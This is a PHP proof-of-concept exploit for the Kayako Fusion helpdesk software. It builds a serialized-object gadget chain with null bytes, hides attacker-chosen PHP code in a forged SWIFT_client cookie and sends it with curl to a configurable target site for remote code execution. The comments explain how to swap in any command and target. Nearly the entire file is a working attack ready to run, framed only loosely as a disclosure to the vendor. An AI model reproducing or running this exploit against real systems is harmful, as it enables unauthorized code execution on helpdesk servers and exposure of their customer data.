<?php
// settings:

$mal = 'phpinfo();';
$exploitsite = "https://link.to.ticketingsite.com";

/*
PROOF OF CONCEPT FOR KAYAKO FUSION

I made it as easy as possible so you can try this out.

The exploit is not publicly available without any authorization from Kayako. (Gained)

Exploiting through modified cookies with nullbytes.

Change variable $mal with your desired command such as phpinfo();
Do not use new lines, but ; to start a new command.

Change the variable $exploitsite, to the site you want to exploit.
Keep in mind, to use phpinfo(); to find out the file name.

NOTE: Once exploit is succesfully ran, as long as the file exist, the exploit cannot be done a second time.
To do this, some values needs to be changed, NOT TESTED!
Possible user ID or template ID needs to be changed in order to be able to generate a new template.
However this is not tested, this is a POC for Kayako and to show how urgently they have to fix this.
*/


// start part
$a = 'O:10:"SWIFT_User":3:{s:15:"XFX*XFX_classLoaded";b:1;s:13:"XFX*XFX_dataStore";a:2:{s:3:"arg";s:8:"stringer";s:6:"userid";i:1100000;}s:19:"NotificationManager";O:25:"SWIFT_NotificationManager":4:{s:15:"XFX*XFX_classLoaded";b:1;s:19:"XFX*XFX_changeContainer";a:1:{s:1:"a";i:1;}s:8:"XFX*XFXCache";O:20:"SWIFT_TemplateEngine":7:{s:33:"XFXSWIFT_TemplateEngineXFX_dwooObject";O:4:"Dwoo":2:{s:9:"XFX*XFXloader";N;s:13:"XFX*XFXcompileDir";s:5:"/tmp/";}s:42:"XFXSWIFT_TemplateEngineXFX_Dwoo_CompilerObject";O:13:"Dwoo_Compiler":1:{s:5:"debug";b:1;}s:4:"Load";O:12:"SWIFT_Loader":1:{s:15:"XFX*XFX_classLoaded";b:1;}s:15:"XFX*XFX_classLoaded";b:1;s:36:"XFXSWIFT_TemplateEngineXFX_templateCache";a:1:{i:1;a:1:{s:10:"staffcache";a:1:{s:8:"contents";s:30:"';
// convert malicious code;
$mal = urlencode($mal);
// php tags
$taga = "%3C%3C%3F%3Fphp ";
$tagb = "%3F%3F%3E%3E";
// assemble php code 
$b = $taga."".$mal."".$tagb;
// end part
$c = '";}}}s:38:"XFXSWIFT_TemplateEngineXFX_templateGroupID";i:1;s:11:"_engineType";i:1;}s:6:"_event";a:1:{s:1:"a";i:1;}}}';

// Convert begin and end strings
$aa = urlencode($a);
$cc = urlencode($c);
// assemble the malicious cookie
$cookies_client = $aa."".$b."".$cc;

//insert null-byte code, this as normal urlencode will distrub the nullbyte code, and the exploit will not work.
$cookies_client = str_replace("XFX","%00",$cookies_client);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$exploitsite);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FRESH_CONNECT, TRUE);
$headers = array();
$headers[] = "Cookie: SWIFT_client=". $cookies_client;

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_VERBOSE, true);

$server_output = curl_exec ($ch);

curl_close ($ch);

print  $server_output ;
